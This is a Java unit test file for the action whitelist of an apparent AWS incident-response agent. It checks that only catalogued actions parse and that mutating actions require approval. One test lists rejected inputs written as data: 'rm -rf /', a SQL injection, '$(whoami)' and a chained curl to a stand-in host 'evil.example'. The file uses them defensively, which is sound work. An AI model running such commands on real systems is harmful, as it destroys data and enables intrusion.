package com.cloudops.agent.entity;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.Optional;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

/**
 * The whitelist is the foundation of the project's safety claim, so it gets tested first.
 *
 * The important assertions here are the negative ones: no shell command, no AWS CLI string and
 * no invented action name may ever resolve to an executable {@link ActionType}.
 */
class ActionTypeTest {

    @Test
    @DisplayName("exact enum names resolve")
    void resolvesExactNames() {
        for (ActionType type : ActionType.values()) {
            assertThat(ActionType.parseSafely(type.name())).contains(type);
        }
    }

    @ParameterizedTest
    @DisplayName("common model formatting variants still resolve")
    @ValueSource(strings = {
            "reboot_ec2_instance",
            "Reboot_Ec2_Instance",
            "reboot ec2 instance",
            "reboot-ec2-instance",
            "  REBOOT_EC2_INSTANCE  "
    })
    void tolerateFormattingVariants(String raw) {
        assertThat(ActionType.parseSafely(raw)).contains(ActionType.REBOOT_EC2_INSTANCE);
    }

    @ParameterizedTest
    @DisplayName("nothing that looks like a command is ever accepted")
    @ValueSource(strings = {
            "aws ec2 reboot-instances --instance-ids i-0123456789",
            "sudo reboot",
            "rm -rf /",
            "; DROP TABLE incidents;--",
            "REBOOT_EC2_INSTANCE && curl http://evil.example/x",
            "run_shell_command",
            "TERMINATE_EC2_INSTANCE",
            "DELETE_SECURITY_GROUP",
            "MODIFY_INSTANCE_ATTRIBUTE",
            "$(whoami)",
            "REBOOT_EC2_INSTANCE_NOW"
    })
    void rejectsAnythingOutsideTheCatalog(String raw) {
        assertThat(ActionType.parseSafely(raw)).isEmpty();
    }

    @Test
    @DisplayName("null and blank input are rejected without throwing")
    void rejectsNullAndBlank() {
        assertThat(ActionType.parseSafely(null)).isEmpty();
        assertThat(ActionType.parseSafely("")).isEmpty();
        assertThat(ActionType.parseSafely("   ")).isEmpty();
    }

    @Test
    @DisplayName("every mutating action requires approval")
    void mutatingActionsRequireApproval() {
        for (ActionType type : ActionType.values()) {
            if (type.isMutating()) {
                assertThat(type.isApprovalRequired())
                        .as("%s changes AWS state so it must require approval", type)
                        .isTrue();
            }
        }
    }

    @Test
    @DisplayName("stopping an instance is the highest-risk action offered")
    void stopIsHighRisk() {
        assertThat(ActionType.STOP_EC2_INSTANCE.getDefaultRisk()).isEqualTo(RiskLevel.HIGH);
        assertThat(ActionType.NO_ACTION.isMutating()).isFalse();
        assertThat(ActionType.NOTIFY_ONCALL.isMutating()).isFalse();
        assertThat(ActionType.RECOMMEND_MANUAL_SCALE_UP.isMutating()).isFalse();
    }

    @Test
    @DisplayName("every action documents itself for the approver")
    void everyActionIsDocumented() {
        for (ActionType type : ActionType.values()) {
            assertThat(type.getDisplayName()).isNotBlank();
            assertThat(type.getDescription()).isNotBlank();
        }
    }

    @Test
    @DisplayName("only EC2 mutations claim to need an EC2 resource")
    void ec2RequirementMatchesMutations() {
        Optional<ActionType> notify = ActionType.parseSafely("NOTIFY_ONCALL");
        assertThat(notify).isPresent();
        assertThat(notify.get().requiresEc2Resource()).isFalse();
        assertThat(ActionType.TAG_FOR_REVIEW.requiresEc2Resource()).isTrue();
    }
}
